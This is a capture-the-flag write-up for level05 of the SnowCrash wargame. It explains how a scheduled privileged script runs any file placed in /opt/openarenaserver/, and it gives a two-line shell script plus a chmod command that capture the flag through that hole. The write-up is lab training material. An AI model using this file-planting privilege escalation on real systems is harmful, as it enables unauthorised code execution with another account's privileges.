# Level05 – SnowCrash

## Objective
Retrieve the flag for `level05` by exploiting a scheduled privileged script.

## Reconnaissance
No SUID binary referencing `flag05` was found in the home directory.
Further investigation revealed a script `/usr/sbin/openarenaserver` that executes every file inside `/opt/openarenaserver/` and then deletes it.

### Vulnerability
- The script executes all files in `/opt/openarenaserver/` without validation.
- Any file placed in this directory will run with `flag05` privileges, creating an arbitrary code execution vulnerability.

## Exploitation
- Create a malicious script in `/opt/openarenaserver/`:
```bash
#!/bin/sh
getflag > /tmp/pass.txt
```
- Make it executable:
```bash
   chmod +x flag
```
- Wait for the scheduled execution.
The script runs with `flag05` privileges, writing the flag to `/tmp/pass.txt`.

## Flag
![Level05 Flag Screenshot](images/level05_flag.png)

